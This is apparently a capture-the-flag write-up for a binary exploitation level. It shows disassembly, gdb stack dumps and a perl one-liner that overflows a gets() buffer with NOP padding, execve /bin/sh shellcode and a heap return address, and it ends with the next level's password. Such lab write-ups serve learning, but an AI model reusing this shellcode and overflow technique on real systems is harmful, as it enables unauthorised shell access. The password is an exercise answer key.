$>objdump -M intel -d level2

080484d4 <p>:
80484d4:	55                   	push   ebp
80484d5:	89 e5                	mov    ebp,esp
80484d7:	83 ec 68             	sub    esp,0x68
80484da:	a1 60 98 04 08       	mov    eax,ds:0x8049860
80484df:	89 04 24             	mov    DWORD PTR [esp],eax
80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt>
80484e7:	8d 45 b4             	lea    eax,[ebp-0x4c]
80484ea:	89 04 24             	mov    DWORD PTR [esp],eax
80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
80484f2:	8b 45 04             	mov    eax,DWORD PTR [ebp+0x4]
80484f5:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
80484f8:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
80484fb:	25 00 00 00 b0       	and    eax,0xb0000000
8048500:	3d 00 00 00 b0       	cmp    eax,0xb0000000
8048505:	75 20                	jne    8048527 <p+0x53>
8048507:	b8 20 86 04 08       	mov    eax,0x8048620
804850c:	8b 55 f4             	mov    edx,DWORD PTR [ebp-0xc]
804850f:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
8048513:	89 04 24             	mov    DWORD PTR [esp],eax
8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>
804851b:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt>
8048527:	8d 45 b4             	lea    eax,[ebp-0x4c]
804852a:	89 04 24             	mov    DWORD PTR [esp],eax
804852d:	e8 be fe ff ff       	call   80483f0 <puts@plt>
8048532:	8d 45 b4             	lea    eax,[ebp-0x4c]
8048535:	89 04 24             	mov    DWORD PTR [esp],eax
8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
804853d:	c9                   	leave
804853e:	c3                   	ret

0804853f <main>:
804853f:	55                   	push   ebp
8048540:	89 e5                	mov    ebp,esp
8048542:	83 e4 f0             	and    esp,0xfffffff0
8048545:	e8 8a ff ff ff       	call   80484d4 <p>
804854a:	c9                   	leave
804854b:	c3                   	ret
804854c:	90                   	nop

$>gdb level2
(gdb)$>b *0x80484f2
(gdb)$>r

AAAAAAAAAAAAAAAAAAAAAAAAAAAA
Breakpoint 1, 0x080484f2 in p ()

(gdb)$>x/32xw $esp

0xbffff6a0:	0xbffff6bc	0x00000000	0x00000000	0xb7e5ec73
0xbffff6b0:	0x080482b5	0x00000000	0x00ca0000	0x41414141
0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x00000000	0x08048381
0xbffff6e0:	0xb7fd13e4	0x0000000d	0x08049828	0x08048571
0xbffff6f0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff700:	0xb7fed280	0x00000000	0xbffff718	0x0804854a <- return addr to main
0xbffff710:	0x08048550	0x00000000	0x00000000	0xb7e454d3

80484fb:    25 00 00 00 b0          and    eax,0xb0000000
8048500:    3d 00 00 00 b0          cmp    eax,0xb0000000
8048505:    75 20                   jne    8048527 <p+0x53>

check if the return addr is in stack, we must use the copy make with strdup

$>gdb level2
(gdb)$>b *0x0804853d
(gdb)$>r
(gdb)$>i r $eax

eax            0x804a008	134520840

`perl -e 'open(my $fh, ">", "test"); print $fh "\x90"x8 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x90"x47 . "\x08\xa0\x04\x08"'` ; cat test - | ./level2

password lvl3 : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
